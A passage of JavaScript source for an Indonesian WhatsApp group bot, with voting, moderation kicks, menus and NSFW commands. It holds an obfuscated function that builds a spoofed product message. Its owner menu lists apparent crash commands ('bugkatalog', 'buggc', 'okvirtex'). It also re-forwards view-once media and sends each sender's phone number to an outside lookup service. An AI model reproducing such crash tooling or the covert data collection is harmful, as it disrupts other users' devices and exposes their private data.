            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "✅",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      } else if (budy.toLowerCase() === "devote") {
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "6285347683869@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "❌",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      }
    }
    const sendKontak = (from, nomor, nama, org = "") => {
      const vcard =
        "BEGIN:VCARD\n" +
        "VERSION:3.0\n" +
        "FN:" +
        nama +
        "\n" +
        "ORG:" +
        org +
        "\n" +
        "TEL;type=CELL;type=VOICE;waid=" +
        nomor +
        ":+" +
        nomor +
        "\n" +
        "END:VCARD";
      ronove.sendMessage(
        from,
        { displayname: nama, vcard: vcard },
        MessageType.contact,
        { quoted: mek }
      );
    };
    //badword by zeeone
if (!m.isBaileys && isGroup && isBadword && !isOwner && !isGroupAdmins && !mek.key.fromMe){
						for (let kasar of badword){
							if (budy.toLowerCase().includes(kasar)){
								if (isCountKasar(sender, senbadword)){
									if (!isBotGroupAdmins) return reply(`Kamu beruntung karena bot bukan admin`)
									sendButMessage(from, `*ANTI BADWORD*\n\nHai ${pushname}\nSepertinya kamu sudah berkata kasar lebih dari 2x, maaf kamu akan di kick`, `Klik Di Bawah Untuk Mematikan`, [
									{
										buttonId: `antibadword off`,
										buttonText: {
											displayText: `🔖 DISABLE ANTI BADWORD`,
											},
											type: 1,
											}]);
									ronove.groupRemove(from, [sender])
									delCountKasar(sender, senbadword)
									} else {
										addCountKasar(sender, senbadword)
										reply(`Kamu terdeteksi berkata kasar\nJangan ulangi lagi atau kamu akan dikick`)
									}
								}
							}
						}
    //kasih wm gw ajg kalau make
    if (isGroup && isAntilink && !mek.key.fromMe) {
      if (budy.includes("chat.whatsapp.com")) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTILINK DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        ronove.groupRemove(from, [sender]);
      }
    }
    if (isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {
      reply(
        `@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`
      );
      var msg = { ...mek };
      msg.mek = mek.message.viewOnceMessage.message;
      msg.mek[Object.keys(msg.mek)[0]].viewOnce = false;
      ronove.copyNForward(m.chat, msg);
    }
    if (
      isGroup &&
      isAntihidetag &&
      m.message[m.mtype]?.contextInfo?.mentionedJid?.length ==
        groupMembers.length
    ) {
      console.log(
        color("[ANTI-HIDETAG]", "red"),
        color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "white")
      );
      reply(`@${sender.split("@")[0]} Terdeteksi mengirim pesan hidetag!!`);
      kick(from, sender);
    }

    if (isGroup && isAntivirtex && !mek.key.fromMe) {
      if (budy.length > 7000) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTIVIRTEX DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        ronove.groupRemove(from, sender);
      }
    }
    if (isGroup && autojoin == true) {
      if (budy.includes("://chat.whatsapp.com/")) {
        console.log(
          color("[AUTO-JOIN]", "red"),
          color("YAHAHAHHAHAH", "white")
        );
        ronove.query({
          json: [
            "action",
            "invite",
            `${budy.replace("https://chat.whatsapp.com/", "")}`,
          ],
        });
      }
    }
    if (isGroup && isKickarea && !mek.key.fromMe) {
      if (sender.includes("62")) {
        reply("GRUP ONLY +62!");
        ronove.groupRemove(from, [sender]);
      }
    }
        const sendmenu = (teks) => {
        	//by ronove
                    ronove.sendMessage(from, { contentText: teks, footerText: `Created by ${namaowner}`, buttons: [{ buttonId: `command`, buttonText: { displayText: 'BY KIRANA' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: iye, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')
                    }
    const sendftrol = (teks) => {
    	//by ronove
    	wette = `${fake}`
      function _0x21f8() {
    var _0x5b970c = ['5573144JYwLrC', '528103swWGih', 'image/jpeg', 'HZ7GZtD+MZleBjG1flbeTuZkDThPV6frfERXi4zTBvs=', 'readFileSync', '69880vdqygB', '431675fOwedq', '3264wpwOzQ', '3ucdrq0UyCuNG5YcUD9aKX4qkuvcip+OonjhACusy5Q=', '988644bxSaXV', '19894ILewVQ', '2QmpxNq', '66214', '9999999', '1341KlrShJ', '2506689kwMmco', './ronove.jpg'];
    _0x21f8 = function () {
        return _0x5b970c;
    };
    return _0x21f8();
}

function _0x4cac(_0x23a824, _0x283a6f) {
    var _0x21f8ef = _0x21f8();
    return _0x4cac = function (_0x4cacde, _0x3311de) {
        _0x4cacde = _0x4cacde - 0xc7;
        var _0x13ea77 = _0x21f8ef[_0x4cacde];
        return _0x13ea77;
    }, _0x4cac(_0x23a824, _0x283a6f);
}
var _0xcdc6be = _0x4cac;
(function (_0x130db2, _0x4b9859) {
    var _0x3cd68e = _0x4cac,
        _0x5ee5d3 = _0x130db2();
    while (!![]) {
        try {
            var _0x2ac92a = -parseInt(_0x3cd68e(0xce)) / 0x1 * (-parseInt(_0x3cd68e(0xc7)) / 0x2) + parseInt(_0x3cd68e(0xcb)) / 0x3 + -parseInt(_0x3cd68e(0xd6)) / 0x4 + -parseInt(_0x3cd68e(0xd3)) / 0x5 + parseInt(_0x3cd68e(0xd4)) / 0x6 * (parseInt(_0x3cd68e(0xd7)) / 0x7) + -parseInt(_0x3cd68e(0xcd)) / 0x8 + parseInt(_0x3cd68e(0xca)) / 0x9 * (-parseInt(_0x3cd68e(0xd2)) / 0xa);
            if (_0x2ac92a === _0x4b9859) break;
            else _0x5ee5d3['push'](_0x5ee5d3['shift']());
        } catch (_0x5691cb) {
            _0x5ee5d3['push'](_0x5ee5d3['shift']());
        }
    }
}(_0x21f8, 0xccadb), anu = ronove['prepareMessageFromContent'](from, {
    'productMessage': {
        'product': {
            'productImage': {
                'url': 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc',
                'mimetype': 'image/jpeg',
                'fileSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=',
                'fileLength': 28777,
                'height': 1080,
                'width': 1079,
                'mediaKey': 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=',
                'fileEncSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=',
                'jpegThumbnail': iye
            },
            'productId': _0xcdc6be(0xc9),
            'title': '' + wette,
            'description': '' + teks,
            'productImageCount': 1
        },
        'businessOwnerJid': "0@s.whatsapp.net",
        'contextInfo': {
            'forwardingScore': 558,
            'isForwarded': !![]
        }
    }
}, {
    'quoted': fdoc,
    'contextInfo': {
        'mentionedJid': [ptod, stod]
    }
}), ronove['relayWAMessage'](anu));
}
    // Runtime Di Bio Bang〆⁩🦢\\
    let settingstatus = 0;
    if (new Date() * 1 - settingstatus > 1000) {
      let _uptime = process.uptime() * 1000;
      let uptime = clockString(_uptime);

await ronove.setStatus(`Aktif selama ${uptime} | ${namabot}`).catch((_) => _);
      settingstatus = new Date() * 1;
    }
    if (!mek.key.fromMe && banChats === true) return;
switch (command) {
case 'help':
case 'menu':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        thu = await ronove.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
ptod = "6281545463585@s.whatsapp.net"
        stod = `${sender}`
        uwu = '*``*'
        yoii = '```'
        timestmp = speed();
        latensie = speed() - timestmp
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `*${ucapanWaktu}〆⁩*`
sendButLocation(from, `${menu}`, `「 ɪɴғᴏ ᴜsᴇʀ 」
▹ Username: ${pushname}
▹ Bio Info: ${thu.status}
▹ Sender: @${sender.split('@')[0]}
▹ XP: ${Xpluu} / ${requiredXplu}

「 ɪɴғᴏ ʙᴏᴛ 」
▹ Prefix : ${prefixStatus ? "Multi Prefix" : "No Prefix"}
▹ Runtime : ${runtime(process.uptime())}
▹ Total Hit : ${totalhit} Hit
▹ Total Chat : ${totalchat.length} Chat 
▹ 𝐒𝐩𝐞𝐞𝐝 : ${latensie.toFixed(4)} _Second_
▹ 𝐀𝐜𝐭𝐢𝐯𝐞 : ${runtime(process.uptime())}
▹ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *Ubuntu Linux*
${readmore}

「 ɪɴғᴏ ᴏᴡɴᴇʀ 」
ɴᴀᴍᴀ : PASHA YOGI PRANATA
ᴀsᴀʟ : ᴋᴀʟɪᴍᴀɴᴛᴀɴ
ɪɴsᴛᴀɢʀᴀᴍ : @pranata_pasha

*┃┃✙◗ ᴛʜᴀɴᴋ ᴛᴏ*
*┃┗━━━━━━━━*
*┃• ᴛʜᴀɴᴋ ᴛᴏ ᴀʟʟᴀʜ*
*┃• ᴛʜᴀɴᴋ ᴛᴏ ʀᴏɴᴏᴠᴇ*
*┃• ᴛʜᴀɴᴋ ᴛᴏ ᴠɪɴᴢ*
*┃• ᴛʜᴀɴᴋ ᴛᴏ ᴠᴀɴʏ*
*┃• ᴛʜᴀɴᴋ ᴛᴏ ᴛᴀǫɪ*
*┃• ᴛʜᴀɴᴋ ᴛᴏ ᴀʟʟ ᴄʀᴇᴀᴛᴏʀ*
*┗━━━━━━━ •*
*ɴᴏᴛᴇ :*
• ɴᴏ ᴄᴀʟʟ ʙᴏᴛ & ᴏᴡɴᴇʀ ᴋᴀʀɴᴀ ᴀᴋᴀɴ ᴅɪʙʟᴏᴄᴋ ᴘᴇʀᴍᴀɴᴇɴ !
•ʙᴏᴛ ᴍᴀsɪʜ ᴅᴀʟᴀᴍ ᴛᴀʜᴀᴘ ᴘᴇʀᴋᴇᴍʙᴀɴɢᴀɴ ᴊᴀᴅɪ ᴊɪᴋᴀ ᴀᴅᴀ ʙᴜɢ ᴀᴛᴀᴜ ʀᴇǫᴜᴇsᴛ ғɪᴛᴜʀ ʙɪsᴀ ʟᴀᴘᴏʀ ᴋᴇ ᴏᴡɴᴇʀ !
•ᴊᴀɴɢᴀɴ sᴘᴀᴍ ʙᴏᴛ !

©KIRANA⁩ | *17.${_registered.length}* User Active`, {jpegThumbnail:iye}, [{buttonId: `command`,buttonText:{displayText: 'ᴍᴇɴᴜ'},type:1},{buttonId:`rules`,buttonText:{displayText:'ʀᴜʟᴇs'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}}, { quoted : mek })
               buffer = fs.readFileSync(`./stik/ara.mp3`)
ronove.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: fg3, ptt: true })
        break
case 'rules':
case 'rules':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        thu = await ronove.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
ptod = "6285347683869@s.whatsapp.net"
        stod = `${sender}`
        uwu = '*``*'
        yoii = '```'
        timestmp = speed();
        latensie = speed() - timestmp
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `*${ucapanWaktu}〆⁩*`
sendButLocation(from, `${menu}`, `
*⚠️ sʏᴀʀᴀᴛ ᴅᴀɴ ᴋᴇᴛᴇɴᴛᴜᴀɴ ⚠️*

*1. ᴘᴇɴɢɢᴜɴᴀ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sᴇᴍᴜᴀ ᴘᴇʀɪɴᴛᴀʜ ᴅᴀɴ ᴛɪᴅᴀᴋ ᴍᴇʟᴀᴋᴜᴋᴀɴ sᴘᴀᴍ ᴛᴇʀʜᴀᴅᴀᴘ ʙᴏᴛ.*
*2. ᴅɪʟᴀʀᴀɴɢ ᴋᴇʀᴀs ᴍᴇɴɢɪʀɪᴍ ᴠɪʀᴛᴇx ᴅᴀɴ sᴇᴍᴀᴄᴀᴍɴʏᴀ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ sᴇʀᴠᴇʀ ᴅᴏᴡɴ ᴀᴛᴀᴜᴘᴜɴ ʙᴏᴛ ᴄʀᴀsʜ.*
*3. ᴘᴇɴɢɢᴜɴᴀ ʏᴀɴɢ ᴍᴇɴɢɪʀɪᴍ ʜᴀʟ ᴀᴛᴀᴜ ᴅᴀᴛᴀ ᴘʀɪʙᴀᴅɪ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪsɪᴍᴘᴀɴ ᴏʟᴇʜ ʙᴏᴛ ɪɴɪ, ᴅᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ʙᴇʀᴛᴀɴɢɢᴜɴɢ ᴊᴀᴡᴀʙ ᴀᴛᴀs ᴅᴀᴛᴀ ᴘʀɪʙᴀᴅɪ ᴛᴇʀsᴇʙᴜᴛ!*
*4. ᴋᴀᴍɪ ᴛɪᴅᴀᴋ ᴘᴇʀɴᴀʜ ᴍᴇᴍɪɴᴛᴀ ᴀɴᴅᴀ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ɪɴғᴏʀᴍᴀsɪ ᴘʀɪʙᴀᴅɪ.*

___❗ ʀᴜʟᴇs ❗_
1. ᴊᴀɴɢᴀɴ sᴘᴀᴍ ʙᴏᴛ.
sᴀɴᴋsɪ : ᴡᴀʀɴ/sᴏғᴛ ʙʟᴏᴄᴋ

2. ᴊᴀɴɢᴀɴ ᴛᴇʟᴇᴘᴏɴ ʙᴏᴛ.
sᴀɴᴋsɪ : sᴏғᴛ ʙʟᴏᴄᴋ

3. ᴊᴀɴɢᴀɴ ᴍᴇɴɢᴇᴋsᴘʟᴏɪᴛᴀsɪ ʙᴏᴛ.
sᴀɴᴋsɪ : ᴘᴇʀᴍᴀɴᴇɴᴛ ʙʟᴏᴄᴋ
___________________


ɴᴏᴛᴇ : ʙᴏᴛ ɪɴɪ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴀᴜᴛᴏʀᴇᴀᴅ ᴀᴛᴀᴜ ʟᴀɴɢsᴜɴғ ᴍᴇᴍʙᴀᴄᴀ ᴘᴇsᴀɴ ʏᴀɴɢ ᴘᴇɴɢɢᴜɴᴀ ᴋɪʀɪᴍ.

ɴᴀᴍᴀ : PASHA YOGI PRANATA
ɴᴏ : 6285347683869
sᴜᴅᴀʜ ᴘᴀʜᴀᴍ?ᴋʟɪᴋ ᴍᴇɴᴜ.`, {jpegThumbnail:iye}, [{buttonId: `command`,buttonText:{displayText: 'ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ'},type:1},{buttonId:`owner`,buttonText:{displayText:'ᴏᴡɴᴇʀ'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}}, { quoted : mek })
               buffer = fs.readFileSync(`./stia.mp3`)
ronove.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: fg3, ptt: true })
        break
case 'ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ':
case 'ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ<':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        thu = await ronove.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
ptod = "6285347683869@s.whatsapp.net"
        stod = `${sender}`
        uwu = '*``*'
        yoii = '```'
        timestmp = speed();
        latensie = speed() - timestmp
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `*ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ*`
sendButLocation(from, `${menu}`, `
*〆⁩*${prefix}ytmp4
*〆⁩*${prefix}ytmp3
*〆⁩*${prefix}play query
*〆⁩*${prefix}instagram <url>
*〆⁩*${prefix}twitter <url>

©DidinSec〆⁩`, {jpegThumbnail:iye}, [{ buttonId: `command`, buttonText: { displayText: 'ʙʏ ᴅɪᴅɪɴ️' }, type: 1 } ], {contextInfo: { mentionedJid: [ptod,stod]}}, { quoted : mek })
               buffer = fs.readFileSync(`./stia.mp3`)
ronove.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: fg3, ptt: true })
        break        
case 'ɢᴀᴄʜᴀᴄᴇᴄᴀɴ':
case 'ɢᴀᴄʜᴀᴄᴇᴄᴀɴ':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        thu = await ronove.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
ptod = "6281545463585@s.whatsapp.net"
        stod = `${sender}`
        uwu = '*``*'
        yoii = '```'
        timestmp = speed();
        latensie = speed() - timestmp
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `*ɢᴀᴄʜᴀ ᴄᴇᴄᴀɴ*`
sendButLocation(from, `${menu}`, `
*〆⁩*${prefix}vietnam
*〆⁩*${prefix}korea
*〆⁩*${prefix}china
*〆⁩*${prefix}indonesia
*〆⁩*${prefix}malaysia
*〆⁩*${prefix}japan
*〆⁩*${prefix}thailand

©DidinSec〆⁩`, {jpegThumbnail:iye}, [{ buttonId: `command`, buttonText: { displayText: 'ʙʏ ᴅɪᴅɪɴ️' }, type: 1 } ], {contextInfo: { mentionedJid: [ptod,stod]}}, { quoted : mek })
               buffer = fs.readFileSync(`./stia.mp3`)
ronove.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: fg3, ptt: true })
        break  
case 'ᴡɪʙᴜᴍᴇɴᴜ':
case 'ᴡɪʙᴜᴍᴇɴᴜ':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        thu = await ronove.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
ptod = "6281545463585@s.whatsapp.net"
        stod = `${sender}`
        uwu = '*``*'
        yoii = '```'
        timestmp = speed();
        latensie = speed() - timestmp
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `*ᴡɪʙᴜ ᴍᴇɴᴜ*`
sendButLocation(from, `${menu}`, `
*〆⁩*${prefix}kurumi
*〆⁩*${prefix}deku
*〆⁩*${prefix}sao
*〆⁩*${prefix}chika
*〆⁩*${prefix}kurumi
*〆⁩*${prefix}kaneki
*〆⁩*${prefix}touka
*〆⁩*${prefix}eren
*〆⁩*${prefix}naruto
*〆⁩*${prefix}minato
*〆⁩*${prefix}sagiri
*〆⁩*${prefix}sasuke
*〆⁩*${prefix}sakura
*〆⁩*${prefix}tsunade
*〆⁩*${prefix}gojosatoru

©DidinSec〆⁩`, {jpegThumbnail:iye}, [{ buttonId: `command`, buttonText: { displayText: 'ʙʏ ᴅɪᴅɪɴ️' }, type: 1 } ], {contextInfo: { mentionedJid: [ptod,stod]}}, { quoted : mek })
               buffer = fs.readFileSync(`./stia.mp3`)
ronove.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: fg3, ptt: true })
        break
case 'ɴsғᴡᴍᴇɴᴜ':
case 'ɴsғᴡᴍᴇɴᴜ':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        thu = await ronove.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
ptod = "6281545463585@s.whatsapp.net"
        stod = `${sender}`
        uwu = '*``*'
        yoii = '```'
        timestmp = speed();
        latensie = speed() - timestmp
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `*ɴsғᴡ ᴍᴇɴᴜ*`
sendButLocation(from, `${menu}`, `
*〆⁩*${prefix}yuri
*〆⁩*${prefix}hentai
*〆⁩*${prefix}anal
*〆⁩*${prefix}lesbian
*〆⁩*${prefix}eroneko
*〆⁩*${prefix}bj
*〆⁩*${prefix}kitsune
*〆⁩*${prefix}pussy
*〆⁩*${prefix}wallpaper
*〆⁩*${prefix}neko2
*〆⁩*${prefix}baka
*〆⁩*${prefix}slap
*〆⁩*${prefix}poke
*〆⁩*${prefix}keta
*〆⁩*${prefix}awoo
*〆⁩*${prefix}blowjob
*〆⁩*${prefix}megumin
*〆⁩*${prefix}neko
*〆⁩*${prefix}trapnime
*〆⁩*${prefix}ass
*〆⁩*${prefix}femdom
*〆⁩*${prefix}hentaigif
*〆⁩*${prefix}yuri
*〆⁩*${prefix}ahegao
*〆⁩*${prefix}cum
*〆⁩*${prefix}masturbation
*〆⁩*${prefix}jahy
*〆⁩*${prefix}orgy
*〆⁩*${prefix}thigs
*〆⁩??*${prefix}panties
*〆⁩*${prefix}foot
*〆⁩*${prefix}gangbang
*〆⁩*${prefix}bdsm
*〆⁩*${prefix}ero
*〆⁩*${prefix}glasses

©DidinSec〆⁩`, {jpegThumbnail:iye}, [{ buttonId: `command`, buttonText: { displayText: 'ʙʏ ᴅɪᴅɪɴ️' }, type: 1 } ], {contextInfo: { mentionedJid: [ptod,stod]}}, { quoted : mek })
               buffer = fs.readFileSync(`./stia.mp3`)
ronove.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: fg3, ptt: true })
        break                       
case 'ɢʀᴏᴜᴘᴍᴇɴᴜ':
case 'ɢʀᴏᴜᴘᴍᴇɴᴜ':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        thu = await ronove.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
ptod = "6281545463585@s.whatsapp.net"
        stod = `${sender}`
        uwu = '*``*'
        yoii = '```'
        timestmp = speed();
        latensie = speed() - timestmp
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `*ɢʀᴏᴜᴘ ᴍᴇɴᴜ*`
sendButLocation(from, `${menu}`, `
*〆⁩*${prefix}grup [3 Button]
*〆⁩*${prefix}promote <reply chat member>
*〆⁩*${prefix}demote <reply chat member>
*〆⁩*${prefix}setdesc
*〆⁩*${prefix}nsfw 1/0
*〆⁩*${prefix}setname
*〆⁩*${prefix}kick <reply/tag member>
*〆⁩*${prefix}add <reply/tag member>
*〆⁩*${prefix}getbio <reply chat member>
*〆⁩*${prefix}getname <reply chat member>
*〆⁩*${prefix}reminder <msg/2s>
*〆⁩*${prefix}listonline
*〆⁩*${prefix}sider [reply chat bot]
*〆⁩*${prefix}antilink
*〆⁩*${prefix}tod 
*〆⁩*${prefix}tospam jumlah
*〆⁩*${prefix}antihidetag
*〆⁩??*${prefix}antiviewonce
*〆⁩*${prefix}autojoin
*〆⁩*${prefix}antivirtex
*〆⁩*${prefix}kickarea

©DidinSec〆⁩`, {jpegThumbnail:iye}, [{ buttonId: `command`, buttonText: { displayText: 'ʙʏ ᴅɪᴅɪɴ️' }, type: 1 } ], {contextInfo: { mentionedJid: [ptod,stod]}}, { quoted : mek })
               buffer = fs.readFileSync(`./stia.mp3`)
ronove.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: fg3, ptt: true })
        break  
case 'sᴛɪᴋᴇʀᴍᴇɴᴜ':
case 'sᴛɪᴋᴇʀᴍᴇɴᴜ':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        thu = await ronove.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
ptod = "6281545463585@s.whatsapp.net"
        stod = `${sender}`
        uwu = '*``*'
        yoii = '```'
        timestmp = speed();
        latensie = speed() - timestmp
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `*sᴛɪᴋᴇʀ ᴍᴇɴᴜ*`
sendButLocation(from, `${menu}`, `
*〆*${prefix}toimg
*〆⁩*${prefix}stiker
*〆⁩*${prefix}swm
*〆⁩*${prefix}take
*〆⁩*${prefix}sgif

©DidinSec〆⁩`, {jpegThumbnail:iye}, [{ buttonId: `command`, buttonText: { displayText: 'ʙʏ ᴅɪᴅɪɴ️' }, type: 1 } ], {contextInfo: { mentionedJid: [ptod,stod]}}, { quoted : mek })
               buffer = fs.readFileSync(`./stia.mp3`)
ronove.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: fg3, ptt: true })
        break
case 'ᴏᴡɴᴇʀᴍᴇɴᴜ':
case 'ᴏᴡɴᴇʀᴍᴇɴᴜ':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        thu = await ronove.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
ptod = "6281545463585@s.whatsapp.net"
        stod = `${sender}`
        uwu = '*``*'
        yoii = '```'
        timestmp = speed();
        latensie = speed() - timestmp
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `*ᴏᴡɴᴇʀ ᴍᴇɴᴜ*`
sendButLocation(from, `${menu}`, `
*〆⁩*${prefix}off
*〆⁩*${prefix}isbaileys
*〆⁩*${prefix}banchat
*〆⁩*${prefix}unbanchat
*〆⁩*${prefix}listbc
*〆⁩*${prefix}antidelete on|off
*〆⁩*${prefix}autoketik on| off
*〆⁩*${prefix}autoread gc on / gc off
*〆⁩*${prefix}autovn on / off
*〆⁩*${prefix}antical on | off
*〆⁩*${prefix}getcaption
*〆⁩*${prefix}bugkatalog
*〆⁩*${prefix}buggc [id grup]
*〆⁩*${prefix}okvirtex
*〆⁩*${prefix}on
*〆⁩*${prefix}status
*〆⁩*${prefix}setthumb
*〆⁩*${prefix}settarget
*〆⁩*${prefix}setfakeimg
*〆⁩*${prefix}setreply
*〆⁩*${prefix}hacked
*〆⁩*${prefix}setprefix
*〆⁩*${prefix}mode [2 Button self/public]
*〆⁩*${prefix}term <code>
*〆⁩*${prefix}eval <code>
*〆⁩*${prefix}colongsw [reply sw]

©DidinSec〆⁩`, {jpegThumbnail:iye}, [{ buttonId: `command`, buttonText: { displayText: 'ʙʏ ᴅɪᴅɪɴ️' }, type: 1 } ], {contextInfo: { mentionedJid: [ptod,stod]}}, { quoted : mek })
               buffer = fs.readFileSync(`./stia.mp3`)
ronove.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: fg3, ptt: true })
        break
case 'ᴜᴘsᴡᴍᴇɴᴜ':
case 'ᴜᴘsᴡᴍᴇɴᴜ':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        thu = await ronove.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
ptod = "6281545463585@s.whatsapp.net"
        stod = `${sender}`
        uwu = '*``*'
        yoii = '```'
        timestmp = speed();
        latensie = speed() - timestmp
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `*ᴜᴘsᴡ ᴍᴇɴᴜ*`
sendButLocation(from, `${menu}`, `
*〆⁩*${prefix}upswteks teks
*〆⁩*${prefix}upswvideo
*〆⁩*${prefix}upswimage
*〆⁩*${prefix}upswvoice
*〆⁩*${prefix}upswsticker
*〆⁩*${prefix}upswlokasi

